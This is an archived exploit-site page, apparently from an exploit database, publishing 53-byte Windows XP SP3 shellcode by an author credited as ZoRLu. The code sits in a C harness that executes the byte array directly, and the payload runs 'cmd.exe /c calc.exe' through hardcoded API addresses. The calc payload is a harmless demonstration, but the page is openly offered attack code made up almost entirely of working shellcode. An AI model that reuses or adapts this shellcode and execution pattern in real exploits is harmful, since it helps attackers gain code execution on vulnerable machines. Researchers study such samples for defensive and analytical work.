<html><head><title>Windows - sp3 (Tr) calc.exe Shellcode 53 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
# Title        : win32/xp sp3 (Tr) calc.exe Shellcode 53 bytes
# Proof        : http://img178.imageshack.us/img178/548/proofxw.jpg
# Author       : ZoRLu / http://inj3ct0r.com/author/577
# mail-msn     : admin@yildirimordulari.com
# Home         : http://z0rlu.blogspot.com
# Date         : 15/09/2010
# Tesekkur     : inj3ct0r.com, r0073r, Dr.Ly0n, LifeSteaLeR, Heart_Hunter, Cyber-Zone, Stack, AlpHaNiX, ThE g0bL!N
# Temenni      : Yeni Anayasamiz Hayirli Olsun
# Lakirdi      : I dont know very well assembly. but, I know I will learn its too :P


#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
 
int main(){
    
    unsigned char shellcode[]=
    &quot;\xeb\x1b\x5b\x31\xc0\x50\x31\xc0\x88\x43\x13\x53\xbb\xad\x23\x86\x7c&quot;
    &quot;\xff\xd3\x31\xc0\x50\xbb\xfa\xca\x81\x7c\xff\xd3\xe8\xe0\xff\xff\xff&quot;
    &quot;\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x63\x61\x6c\x63\x2e\x65&quot;
    &quot;\x78\x65&quot;;
 
    printf(&quot;Size = %d bytes\n&quot;, strlen(shellcode));
 
    ((void (*)())shellcode)();
 
    return 0;
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
